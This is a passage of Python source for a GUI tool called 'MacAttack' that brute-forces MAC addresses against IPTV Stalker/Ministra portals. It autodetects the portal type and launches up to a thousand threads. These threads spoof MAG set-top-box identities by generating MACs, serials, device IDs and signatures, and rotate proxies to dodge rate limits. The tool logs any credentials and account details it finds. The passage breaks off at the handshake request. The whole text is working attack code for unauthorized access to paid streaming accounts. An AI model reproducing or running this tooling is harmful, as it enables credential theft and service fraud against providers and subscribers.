                config.get("Settings", "location_output", fallback="False") == "True"
            )
            self.backend_output_checkbox.setChecked(
                config.get("Settings", "backend_output", fallback="False") == "True"
            )
            self.username_output_checkbox.setChecked(
                config.get("Settings", "username_output", fallback="False") == "True"
            )
            self.datefound_output_checkbox.setChecked(
                config.get("Settings", "datefound_output", fallback="False") == "True"
            )
            self.max_connections_output_checkbox.setChecked(
                config.get("Settings", "max_connections_output", fallback="False")
                == "True"
            )
            self.date_created_output_checkbox.setChecked(
                config.get("Settings", "date_created_output", fallback="False")
                == "True"
            )
            self.proxy_used_output_checkbox.setChecked(
                config.get("Settings", "proxy_used_output", fallback="False") == "True"
            )
            self.singleoutputfile_checkbox.setChecked(
                config.get("Settings", "singleoutputfile", fallback="False") == "True"
            )
            self.proxy_location_output_checkbox.setChecked(
                config.get("Settings", "proxy_location_output", fallback="False")
                == "True"
            )
            self.proxy_textbox.setPlainText(
                config.get("Settings", "proxy_list", fallback="")
            )

            self.proxy_remove_errorcount.setValue(
                config.getint("Settings", "proxy_remove_errorcount", fallback=5)
            )
            self.proxy_input.setText(config.get("Settings", "proxy_input", fallback=""))
            self.output_buffer_spinbox.setValue(
                config.getint("Settings", "output_buffer", fallback=2500)
            )
            self.tabs.setCurrentIndex(
                config.getint("Settings", "active_tab", fallback=0)
            )
            self.dont_update_checkbox.setChecked(
                config.get("Settings", "dont_update", fallback="False") == "True"
            )
            # Load custom MAC settings
            self.use_custom_macs_checkbox.setChecked(
                config.get("Settings", "use_custom_macs", fallback="False") == "True"
            )
            self.remove_for_seconds_spinbox.setValue(
                config.getint("Settings", "ratelimit_timeout", fallback=30)
            )

            self.list_genres_checkbox.setChecked(
                config.get("Settings", "list_genres", fallback="False") == "True"
            )
            self.vod_list_checkbox.setChecked(
                config.get("Settings", "list_vod", fallback="False") == "True"
            )
            self.proxy_altspeed_checkbox.setChecked(
                config.get("Settings", "alt_proxy_speed", fallback="False") == "True"
            )

            # Load window geometry
            if config.has_section("Window"):
                self.resize(
                    config.getint("Window", "width", fallback=800),
                    config.getint("Window", "height", fallback=600),
                )
                self.move(
                    config.getint("Window", "x", fallback=200),
                    config.getint("Window", "y", fallback=200),
                )

            if self.use_custom_macs_checkbox.isChecked():
                file_path = self.mac_file_label.text()
                # Strip the phrase "Selected File: " from the file_path
                file_path = file_path.replace("Selected File: ", "").strip()
                # Load the file
                self.load_mac_file(file_path)

            logging.debug("Settings loaded.")
        else:
            logging.debug("No settings file found.")
        if not self.dont_update_checkbox.isChecked():
            logging.info("Checking for update")
            self.update_worker = UpdateWorker()
            self.update_worker.update_checked.connect(self.show_update_popup)
            self.update_worker.start()

    def set_window_icon(self):
        # Base64 encoded image string (replace with your own base64 string)
        base64_image_data = "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"
        # Decode the base64 string
        image_data = base64.b64decode(base64_image_data)
        # QPixmap from the decoded data
        pixmap = QPixmap()
        byte_array = QByteArray(image_data)
        buffer = QBuffer(byte_array)
        buffer.open(QBuffer.ReadOnly)
        pixmap.loadFromData(buffer.data())
        # Set the QIcon using the pixmap
        self.setWindowIcon(QIcon(pixmap))

    def TestDrive(self):
        self.cleaningup = 0
        self.nomacs = 1
        self.update_error_text_signal.emit("clearall")
        self.update_error_text_signal.emit(
            "███╗░░░███╗░█████╗░░█████╗░░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗██╗\n"
            "████╗░████║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝██║\n"
            "██╔████╔██║███████║██║░░╚═╝███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░██║\n"
            "██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░╚═╝\n"
            "██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗██╗\n"
            "╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝\n\n"
            "It's normal for errors to appear down here.\n"
        )
        self.SaveTheDay()
        # Update button states immediately
        self.running = True
        self.start_button.setDisabled(True)
        self.stop_button.setDisabled(False)
        if self.proxy_enabled_checkbox.isChecked():
            self.brute_mac_label.setText("Please Wait...\nLoading.")
        else:
            self.brute_mac_label.setText("Please Wait...")
        # Pause for 1 second before starting threads
        QTimer.singleShot(1000, self.start_threads)

    def start_threads(self):
        # Offload thread creation to a worker thread
        creation_thread = threading.Thread(target=self._create_threads)
        creation_thread.daemon = True
        creation_thread.start()

    def is_valid_url(self, url):
        logging.info("checking iptv_link")
        self.update_error_text_signal.emit("Checking if URL is valid")


        parsed_url = urlparse(url)
        if parsed_url.scheme not in ("http", "https"):
            self.update_error_text_signal.emit("Error: Not HTTP or HTTPS.")
            return False
        if not parsed_url.hostname:
            self.update_error_text_signal.emit("Error: No Hostname")
            return False

#        # Check if its reachable
#        try:
#            with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
#                response = requests.head(url, timeout=15)
#            if response.ok:  # Check if we get any response
#                self.update_error_text_signal.emit(
#                    "Received valid response from the link, proceeding..."
#                )
#                return True
#            else:
#                logging.debug(f"Status Code: {response.status_code}")
#                self.update_error_text_signal.emit("Error: Invalid response from server.")
#                return False
#
#        except requests.RequestException as e:
#            logging.debug(f"Request failed: {str(e)}")
#            self.update_error_text_signal.emit(f"Error: {str(e)}")
#            return False
        return True


    def _create_threads(self):  
        self.proxy_queue = deque()
        if self.proxy_altspeed_checkbox.isChecked():
            
            if not self.proxy_queue:
                # Create the deque if it doesn't exist
                self.altspeedproxies = self.proxy_textbox.toPlainText().strip().splitlines()
                self.proxy_queue = deque(self.altspeedproxies)            
            
            
            
            
        global portaltype
        portal_type_detected = True

        # Get and parse the IPTV link
        self.iptv_link = self.iptv_link_entry.text()

        self.parsed_url = urlparse(self.iptv_link)
        self.parsed_path = self.parsed_url.path
        #logging.debug(self.parsed_path)
        # remove the c/ from the path
        if self.parsed_path.endswith("c"):
            self.parsed_path = self.parsed_path[:-1]
        if self.parsed_path.endswith("c/"):
            self.parsed_path = self.parsed_path[:-2]
        logging.debug(self.parsed_path)
        self.host = self.parsed_url.hostname
        self.protocol = self.parsed_url.scheme
        self.port = self.parsed_url.port or 80
        self.base_url = f"{self.protocol}://{self.host}:{self.port}"
        # Check if the url is valid
        if not self.is_valid_url(self.base_url):
            logging.debug(f"Invalid URL {self.iptv_link}")
            self.update_error_text_signal.emit(
                "ERROR: The URL IS NOT VALID. CANNOT PROCEED"
            )
            self.brute_mac_label.setText("ERROR: INVALID URL")
            self.start_button.setDisabled(False)
            self.stop_button.setDisabled(True)
            return
        headers = {
            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
            "Accept-Encoding": "identity",
            "Accept": "*/*",
            "Connection": "keep-alive",
        }

        if self.dropdown_box.currentText() == "Autodetect":
            self.update_error_text_signal.emit(
                "Autodetect enabled, autodetecting Portaltype."
            )
            portal_type_detected = False  # Skip autodetect if user set
            logging.debug("Skipping Autodetect")
            portaltype = None
        else:
            self.update_error_text_signal.emit("User set Portaltype, not autodetecting")

        if not portal_type_detected:  # Check for type portal
            version_url = f"{self.base_url}/c/version.js"
            logging.debug(f"Version URL: {version_url}")
            try:
                with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                    response = requests.get(
                        version_url, headers=headers, timeout=10
                    )  # Add headers here
                    response.raise_for_status()  # Raise an exception for HTTP errors

                    # Extract the version using a regex
                    match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
                    if match:
                        self.portal_version = match.group(1)  # Extracted version string
                        logging.debug(version_url)
                        logging.info(
                            f"\n\n\nPortal type: PORTAL version: {self.portal_version}\n\n\n"
                        )
                        portal_type_detected = "portal"
                        self.update_error_text_signal.emit(
                            f"Portal type detected: Portal Version: {self.portal_version}\n"
                        )
                        portaltype = "portal.php"
                    else:
                        logging.debug("Version declaration not found in the file.")
            except requests.RequestException as e:
                logging.debug(f"Not type PORTAL: {e}")

        if not portal_type_detected:  # check for type stalker_portal
            version_url = f"{self.base_url}/stalker_portal/c/version.js"
            logging.debug(f"Version URL: {version_url}")
            try:
                response = requests.get(
                    version_url, headers=headers, timeout=10
                )  # Add headers here
                response.raise_for_status()  # Raise an exception for HTTP errors

                # Extract the version using a regex
                match = re.search(r"var ver = ['\"](.*?)['\"];", response.text)
                if match:
                    self.portal_version = match.group(1)  # Extracted version string
                    logging.debug(version_url)
                    self.update_error_text_signal.emit(
                        f"Portal type detected: stalker_portal Version: {self.portal_version}\n"
                    )
                    portal_type_detected = "stalker_portal"
                    portaltype = "stalker_portal/server/load.php"
                else:
                    logging.debug("Version declaration not found in the file.")
            except requests.RequestException as e:
                logging.debug(f"Not type STALKER_PORTAL: {e}")

        if not portal_type_detected:  # Others failed, default to "portal"
            portaltype = "portal.php"
            self.portal_version = "5.3.1"

            self.update_error_text_signal.emit(
                f"<b>WARNING:</b> No Portal detected! using default value {portaltype} {self.portal_version}<br>"
                "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If this is not a valid portal you will not get any results.<br>"
            )

        # Make sure that there is exactly one slash between the port and the path
        if self.parsed_path and not self.parsed_path.startswith('/'):
            self.parsed_path = '/' + self.parsed_path
        elif not self.parsed_path:  # If there's no parsed path add a slash
            self.parsed_path = '/'

        self.base_url = f"{self.protocol}://{self.host}:{self.port}{self.parsed_path}"







        # if both url and method contain "stalker_portal/" then remove it from the url
        if "stalker_portal/" in self.base_url and "stalker_portal/" in portaltype:
            self.base_url = self.base_url.replace("stalker_portal/", "")
        logging.debug(self.base_url)
        logging.info(f"Portal Type: {portaltype}")

        # Calculate the number of threads to start
        num_tests = self.concurrent_tests.value()
        if self.proxy_enabled_checkbox.isChecked() and num_tests > 1:
            max_value = 100
            num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
            num_tests = int(num_tests)
            if self.ludicrous_speed_checkbox.isChecked() and num_tests > 1:
                max_value = 1000
                num_tests = 1 + (num_tests - 1) * (max_value - 1) / (1800 - 1)
                num_tests = int(num_tests)
        else:
            max_value = 50
            num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
            num_tests = int(num_tests)
        # Start threads to test MACs
        
        
        if self.proxy_altspeed_checkbox.isChecked():
            num_tests = len(self.proxy_queue)
        for _ in range(num_tests):
            thread = threading.Thread(target=self.BigMacAttack)
            thread.daemon = True
            thread.start()
            # Track threads
            self.threads.append(thread)

        # self.SaveTheDay()

    def RandomMacGenerator(self, prefix="00:1A:79:"):
        custommacs = self.use_custom_macs_checkbox.isChecked()

        if not custommacs:
            # Generate a random MAC
            return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
        else:
            if not self.mac_dict:
                logging.info("MAC deque is empty!")
                return ""

            # The current size of the deque
            current_size = len(self.mac_dict)
            if current_size == 0:
                logging.info("MAC deque is empty!")
                return ""

            # Get the next MAC address in the sequence
            index = self.generated_count % current_size
            mac = self.mac_dict[index]

            self.generated_count += 1  # Up the count by 1 for the next use
            return mac

    def macattack_update_proxy_textbox(self, new_text):
        if self.proxy_textbox:
            self.proxy_textbox.setText(
                new_text
            )  # Set the text of the textbox to the provided new text
        else:
            logging.error("Proxy textbox is not initialized.")

    def macattack_update_mac_count(self):
        mac_count = len(self.mac_dict)
        if self.macs_in_mem_label:
            self.macs_in_mem_label.setText(f"{mac_count}")
        else:
            logging.error("MAC count label is not initialized.")

    def BigMacAttack(self):
        # BigMacAttack: Two all-beef patties, special sauce, lettuce, cheese, pickles, onions, on a sesame seed bun.

        global mac_count
        global portaltype
        timeout = 30
        proxies = {}
        hostname = None
        domain_and_port = None
        username = None
        password = None
        middleware_city = None
        middleware_ip_address = None
        backend_host = None
        backend_ip_address = None
        self.recentlyfound = []  # Erase recently found list
        iptv_url = self.iptv_link
        base_url = self.base_url
        self.hits = 0
        alt_speed_enabled = self.proxy_altspeed_checkbox.isChecked()


        selected_proxy = None

        while self.running:


            # Checkbox states

            include_date_found = self.datefound_output_checkbox.isChecked()
            include_deviceids = self.deviceid_output_checkbox.isChecked()
            include_user_creds = self.username_output_checkbox.isChecked()
            include_backend_info = self.backend_output_checkbox.isChecked()
            include_ip_addresses = self.ip_address_output_checkbox.isChecked()
            include_location_and_timezone = self.location_output_checkbox.isChecked()
            include_max_connections = self.max_connections_output_checkbox.isChecked()
            include_date_created = self.date_created_output_checkbox.isChecked()
            include_proxy_used = self.proxy_used_output_checkbox.isChecked()
            include_proxy_location = self.proxy_location_output_checkbox.isChecked()
            ratelimit_timeout = self.remove_for_seconds_spinbox.value()
            include_genres = self.list_genres_checkbox.isChecked()
            include_vod = self.vod_list_checkbox.isChecked()
            custommacs = self.use_custom_macs_checkbox.isChecked()
            Ludicrous_speed = self.ludicrous_speed_checkbox.isChecked()
            if custommacs:
                self.macattack_update_mac_count_signal.emit()
                self.nomacs = 0
            created_at = None
            max_connections = None
            active_cons = None

            if self.proxy_enabled_checkbox.isChecked():
                # Get the proxies from the textbox, splitting by line
                proxies = self.proxy_textbox.toPlainText().strip().splitlines()
                # Check if the proxy list is empty
                if not proxies:
                    # Show error message
                    self.stop_button.click()
                    self.update_error_text_signal.emit("ERROR: Proxy list is empty")
                    return  # Stop the process if no proxies are available
                    
                # Choose a random proxy from the list
                if not alt_speed_enabled:
                    selected_proxy = None
                if not selected_proxy:  # Check only if no proxy is already set
                    if alt_speed_enabled:
                        logging.info("No proxy assigned")
                        if not self.proxy_queue:  # If the deque is empty
                            logging.info("All proxies are used up, exiting thread.")
                            break  # Exit the thread if no proxies are left
                        selected_proxy = self.proxy_queue.popleft()
                        logging.info(f"{selected_proxy} chosen from deque")
                    else:
                        # Only choose a random proxy if alt_speed_enabled is not checked
                        selected_proxy = random.choice(proxies)
                
                
                
                logging.debug(f"Using proxy: {selected_proxy}")
                # Ensure the proxy is set correctly as a dictionary
                proxies = {"http": selected_proxy, "https": selected_proxy}
            else:
                selected_proxy = "Your Connection"

            #mac = self.RandomMacGenerator()  # Generate a random MAC
            mac = self.RandomMacGenerator(prefix=self.customprefix) # Generate a random MAC with a prefix
            if mac == "":
                # Show error message
                self.update_error_text_signal.emit("<b>Custom MACs list is empty</b>")
                self.nomacs = 1
                self.brute_mac_label.setText("")
                self.stop_button.click()

                return  # Stop the process if no MACs are available
            serialnumber = hashlib.md5(mac.encode()).hexdigest().upper()
            sn = serialnumber[0:13]
            device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
            device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
            hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
            snmac = f"{sn}{mac}"
            sig = hashlib.sha256(snmac.encode()).hexdigest().upper()

            if not proxies:
                self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
                self.update_hits_label_signal.emit(f"Hits: {self.hits}  ")
            if proxies:
                self.update_mac_label_signal.emit(
                    f"Testing MAC: {mac:<19} Using PROXY: {selected_proxy:<23}"
                )
                self.update_hits_label_signal.emit(
                    f"Hits: {self.hits}"
                )
            try:

                with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                    macattacksess = requests.Session()  # session

                    # Disable the use of environment proxy settings
                    macattacksess.proxies.clear()  # Clears any environment proxies
                    macattacksess.cookies.update(
                        {
                            "adid": hw_version_2,
                            "debug": "1",
                            "device_id2": device_id2,
                            "device_id": device_id,
                            "hw_version": "1.7-BD-00",
                            "mac": mac,
                            "sn": sn,
                            "stb_lang": "en",
                            "timezone": "America/Los_Angeles",
                        }
                    )
                    macattacksess.headers.update(
                        {
                            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                            "Accept-Encoding": "identity",
                            "Accept": "*/*",
                            "Connection": "keep-alive",
                        }
                    )

                    url = f"{base_url}{portaltype}?action=handshake&type=stb&JsHttpRequest=1-xml"

                    logging.debug(f"Getting URL {url}")

                    # If proxy is enabled, the proxy to the session
                    if proxies:
                        macattacksess.proxies.update(proxies)

                    res = macattacksess.get(url, timeout=timeout)

